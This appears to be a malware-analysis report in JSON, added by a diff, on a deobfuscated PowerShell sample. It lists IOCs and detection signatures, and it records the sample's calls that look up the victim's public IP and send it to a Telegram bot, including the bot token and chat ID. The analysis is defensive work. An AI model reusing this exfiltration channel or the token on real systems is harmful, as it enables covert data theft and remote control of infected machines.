@@ -1,0 +1,566 @@
+{
+  "extra": {
+    "drop_file": false,
+    "score": 1043,
+    "sections": [
+      {
+        "auto_collapse": false,
+        "body": "[Invoke-RestMethod] GET https://ipv6.icanhazip.com/%2f\n\n[Invoke-RestMethod] GET https://ipv4.icanhazip.com/%2f\n\n[Invoke-RestMethod] POST https://api.telegram.org/%2fbot6392527025%3aAAGRXvzuXhqhhAj_MKiNxAyrfnnMEtWGIH4%2fsendMessage%3fparse_mode%3dhtml%26disable_web_page_preview%3dtrue%26chat_id%3d-1002046619275%26text%3d%257B%250A%2520%2520%2522ipv4%2522%3a%2520%2522127.0.0.1%2522%2c%250A%2520%2520%2522ipv6%2522%3a%2520%2522127.0.0.1%2522%250A%257D\n\n[Sleep] 3\n\n[Invoke-RestMethod] POST https://api.telegram.org/%2fbot6392527025%3aAAGRXvzuXhqhhAj_MKiNxAyrfnnMEtWGIH4%2fgetUpdates\n",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 5,
+          "score": 1000,
+          "score_map": {},
+          "signatures": {
+            "telegram_post": 2
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Actions detected with PSDecode",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "ioc": "api.telegram.org",
+            "ioc_type": "domain"
+          },
+          {
+            "ioc": "ipv4.icanhazip.com",
+            "ioc_type": "domain"
+          },
+          {
+            "ioc": "ipv6.icanhazip.com",
+            "ioc_type": "domain"
+          },
+          {
+            "ioc": "https://api.telegram.org/%2Fbot6392527025%3AAAGRXvzuXhqhhAj_MKiNxAyrfnnMEtWGIH4%2FgetUpdates",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "https://api.telegram.org/%2Fbot6392527025%3AAAGRXvzuXhqhhAj_MKiNxAyrfnnMEtWGIH4%2FsendMessage%3Fparse_mode%3Dhtml%26disable_web_page_preview%3Dtrue%26chat_id%3D-1002046619275%26text%3D%257B%250A%2520%2520%2522ipv4%2522%3A%2520%2522127.0.0.1%2522%2C%250A%2520%2520%2522ipv6%2522%3A%2520%2522127.0.0.1%2522%250A%257D",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "https://ipv4.icanhazip.com/%2F",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "https://ipv6.icanhazip.com/%2F",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "/%2F",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/%2Fbot6392527025%3AAAGRXvzuXhqhhAj_MKiNxAyrfnnMEtWGIH4%2FgetUpdates",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/%2Fbot6392527025%3AAAGRXvzuXhqhhAj_MKiNxAyrfnnMEtWGIH4%2FsendMessage%3Fparse_mode%3Dhtml%26disable_web_page_preview%3Dtrue%26chat_id%3D-1002046619275%26text%3D%257B%250A%2520%2520%2522ipv4%2522%3A%2520%2522127.0.0.1%2522%2C%250A%2520%2520%2522ipv6%2522%3A%2520%2522127.0.0.1%2522%250A%257D",
+            "ioc_type": "uri_path"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 1,
+          "score": 1,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {
+          "network": {
+            "dynamic": {
+              "domain": [
+                "api.telegram.org",
+                "ipv4.icanhazip.com",
+                "ipv6.icanhazip.com"
+              ],
+              "ip": [
+                "127.0.0.1"
+              ],
+              "uri": [
+                "https://api.telegram.org/%2Fbot6392527025%3AAAGRXvzuXhqhhAj_MKiNxAyrfnnMEtWGIH4%2FgetUpdates",
+                "https://api.telegram.org/%2Fbot6392527025%3AAAGRXvzuXhqhhAj_MKiNxAyrfnnMEtWGIH4%2FsendMessage%3Fparse_mode%3Dhtml%26disable_web_page_preview%3Dtrue%26chat_id%3D-1002046619275%26text%3D%257B%250A%2520%2520%2522ipv4%2522%3A%2520%2522127.0.0.1%2522%2C%250A%2520%2520%2522ipv6%2522%3A%2520%2522127.0.0.1%2522%250A%257D",
+                "https://ipv4.icanhazip.com/%2F",
+                "https://ipv6.icanhazip.com/%2F"
+              ],
+              "uri_path": [
+                "/%2F",
+                "/%2Fbot6392527025%3AAAGRXvzuXhqhhAj_MKiNxAyrfnnMEtWGIH4%2FgetUpdates",
+                "/%2Fbot6392527025%3AAAGRXvzuXhqhhAj_MKiNxAyrfnnMEtWGIH4%2FsendMessage%3Fparse_mode%3Dhtml%26disable_web_page_preview%3Dtrue%26chat_id%3D-1002046619275%26text%3D%257B%250A%2520%2520%2522ipv4%2522%3A%2520%2522127.0.0.1%2522%2C%250A%2520%2520%2522ipv6%2522%3A%2520%2522127.0.0.1%2522%250A%257D"
+              ]
+            }
+          }
+        },
+        "title_text": "IOCs found in actions",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": null,
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": null,
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Suspicious Content Detected in 928bd805b924ebe43169ad6d670acb2dfe45722e17d461ff0394852b82862d23",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "Marks: Invoke-RestMethod, -Uri",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "Downloader": 10
+          },
+          "signatures": {
+            "Downloader": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: Downloader",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "Marks: Invoke-Expression",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "Script Execution": 10
+          },
+          "signatures": {
+            "Script Execution": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: Script Execution",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "Marks: sleep ",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "Sleeps": 10
+          },
+          "signatures": {
+            "Sleeps": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: Sleeps",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "ioc": "LastPost.channel",
+            "ioc_type": "domain"
+          },
+          {
+            "ioc": "api.telegram.org",
+            "ioc_type": "domain"
+          },
+          {
+            "ioc": "ipv4.icanhazip.com",
+            "ioc_type": "domain"
+          },
+          {
+            "ioc": "ipv6.icanhazip.com",
+            "ioc_type": "domain"
+          },
+          {
+            "ioc": "https://api.telegram.org/bot$BotToken",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "https://api.telegram.org/bot$BotToken/sendMessage?parse_mode=html&disable_web_page_preview=true&chat_id=$ChatID&text=$h_json",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "https://ipv4.icanhazip.com",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "https://ipv6.icanhazip.com",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "/bot$BotToken",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/bot$BotToken/sendMessage?parse_mode=html&disable_web_page_preview=true&chat_id=$ChatID&text=$h_json",
+            "ioc_type": "uri_path"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 1,
+          "score": 1,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {
+          "network": {
+            "static": {
+              "domain": [
+                "LastPost.channel",
+                "api.telegram.org",
+                "ipv4.icanhazip.com",
+                "ipv6.icanhazip.com"
+              ],
+              "uri": [
+                "https://api.telegram.org/bot$BotToken",
+                "https://api.telegram.org/bot$BotToken/sendMessage?parse_mode=html&disable_web_page_preview=true&chat_id=$ChatID&text=$h_json",
+                "https://ipv4.icanhazip.com",
+                "https://ipv6.icanhazip.com"
+              ],
+              "uri_path": [
+                "/bot$BotToken",
+                "/bot$BotToken/sendMessage?parse_mode=html&disable_web_page_preview=true&chat_id=$ChatID&text=$h_json"
+              ]
+            }
+          }
+        },
+        "title_text": "IOC(s) extracted from 928bd805b924ebe43169ad6d670acb2dfe45722e17d461ff0394852b82862d23",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": null,
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": null,
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Suspicious Content Detected in layer_0.ps1",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": null,
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "One Liner": 10
+          },
+          "signatures": {
+            "One Liner": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: One Liner",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "ioc": "127.0.0.1",
+            "ioc_type": "ip"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 1,
+          "score": 1,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {
+          "network": {
+            "static": {
+              "ip": [
+                "127.0.0.1"
+              ]
+            }
+          }
+        },
+        "title_text": "IOC(s) extracted from layer_0.ps1",
+        "zeroize_on_tag_safe": false
+      }
+    ]
+  },
+  "files": {
+    "extracted": [
+      {
+        "name": "deobfuscated_by_ps1profiler_928bd805b924ebe43169ad6d670acb2dfe45722e17d461ff0394852b82862d23",
+        "sha256": "7cec040833d9bd971ecba57c0ac0d3dc5aec6ab9885944fe3b23df85b68df00f"
+      }
+    ],
+    "supplementary": [
+      {
+        "name": "12ca17b49af2289436f303e0166030a21e525d266e209267433801a8fd4071a0",
+        "sha256": "12ca17b49af2289436f303e0166030a21e525d266e209267433801a8fd4071a0"
+      }
+    ]
+  },
+  "results": {
+    "heuristics": [
+      {
+        "attack_ids": [],
+        "heur_id": 1,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 1,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 1,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "Downloader"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "Script Execution"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "Sleeps"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "One Liner"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 5,
+        "signatures": [
+          "telegram_post"
+        ]
+      }
+    ],
+    "tags": {
+      "network.dynamic.domain": [
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "api.telegram.org"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "ipv4.icanhazip.com"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "ipv6.icanhazip.com"
+        }
+      ],
+      "network.dynamic.ip": [
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "127.0.0.1"
+        }
+      ],
+      "network.dynamic.uri": [
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "https://api.telegram.org/%2Fbot6392527025%3AAAGRXvzuXhqhhAj_MKiNxAyrfnnMEtWGIH4%2FgetUpdates"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "https://api.telegram.org/%2Fbot6392527025%3AAAGRXvzuXhqhhAj_MKiNxAyrfnnMEtWGIH4%2FsendMessage%3Fparse_mode%3Dhtml%26disable_web_page_preview%3Dtrue%26chat_id%3D-1002046619275%26text%3D%257B%250A%2520%2520%2522ipv4%2522%3A%2520%2522127.0.0.1%2522%2C%250A%2520%2520%2522ipv6%2522%3A%2520%2522127.0.0.1%2522%250A%257D"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "https://ipv4.icanhazip.com/%2F"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "https://ipv6.icanhazip.com/%2F"
+        }
+      ],
+      "network.dynamic.uri_path": [
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "/%2F"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "/%2Fbot6392527025%3AAAGRXvzuXhqhhAj_MKiNxAyrfnnMEtWGIH4%2FgetUpdates"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "/%2Fbot6392527025%3AAAGRXvzuXhqhhAj_MKiNxAyrfnnMEtWGIH4%2FsendMessage%3Fparse_mode%3Dhtml%26disable_web_page_preview%3Dtrue%26chat_id%3D-1002046619275%26text%3D%257B%250A%2520%2520%2522ipv4%2522%3A%2520%2522127.0.0.1%2522%2C%250A%2520%2520%2522ipv6%2522%3A%2520%2522127.0.0.1%2522%250A%257D"
+        }
+      ],
+      "network.static.domain": [
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "LastPost.channel"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "api.telegram.org"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "ipv4.icanhazip.com"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "ipv6.icanhazip.com"
+        }
+      ],
+      "network.static.ip": [
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "127.0.0.1"
+        }
+      ],
+      "network.static.uri": [
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "https://api.telegram.org/bot$BotToken"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "https://api.telegram.org/bot$BotToken/sendMessage?parse_mode=html&disable_web_page_preview=true&chat_id=$ChatID&text=$h_json"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "https://ipv4.icanhazip.com"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "https://ipv6.icanhazip.com"
+        }
+      ],
+      "network.static.uri_path": [
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "/bot$BotToken"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "/bot$BotToken/sendMessage?parse_mode=html&disable_web_page_preview=true&chat_id=$ChatID&text=$h_json"
+        }
+      ]
+    },
+    "temp_submission_data": {
+      "deobfuscated_by_ps1profiler": true
+    }
+  }
+}
